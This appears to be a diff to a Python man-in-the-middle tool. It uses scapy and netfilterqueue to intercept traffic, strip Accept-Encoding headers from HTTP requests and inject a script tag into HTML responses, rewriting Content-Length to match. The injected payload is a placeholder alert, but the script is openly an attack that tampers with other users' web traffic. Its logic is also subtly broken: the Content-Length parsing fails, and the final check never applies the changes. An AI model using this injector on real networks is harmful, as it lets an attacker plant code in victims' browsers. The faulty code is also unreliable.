@@ -25,22 +25,44 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy format
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet.haslayer(scapy.TCP): 
+            load = scapy_packet[scapy.Raw].load
             if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 443:
                 print("[+] Request")
                 #print(scapy_packet.show())
+                # substitute the encoding field in html header with null string
                 #modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "Accept-Encoding:identity\r\n", str(scapy_packet[scapy.Raw].load))
-                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(scapy_packet[scapy.Raw].load))
-                new_packet = set_load(scapy_packet, modified_load)
-                packet.set_payload(bytes(new_packet))
+                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load))
+
             elif scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].dport == 443:
                 print("[+] Response")
                 #print(scapy_packet.show())
-                modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
+                injection_code = "<script>alert('test');</script>"
+                modified_load = load.replace("</body>", injection_code + "</body>")
+                # Search for a "Content-Length" expression in the modified html data
+                # use double forward slash for escape character
+                content_length_search = re.search("(?:Content-Length:\\s)(\\d*)", modified_load)
+                if content_length_search and "text/html" in modified_load:
+                    content_length = content_length_search.group(0)
+                    new_content_length = int(content_length) + len(injection_code)
+                    #print(content_length)
+                    modified_load = modified_load.replace(content_length, str(new_content_length))
+
+            # update the pkt only if either the Encoding or Content length is changed
+            if load != scapy_packet[scapy.Raw].load:
                 new_packet = set_load(scapy_packet, modified_load)
                 packet.set_payload(bytes(new_packet))
+
     packet.accept()
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+
+
+try:
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
+
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C.....closing the application....Please wait...")
+
+
 
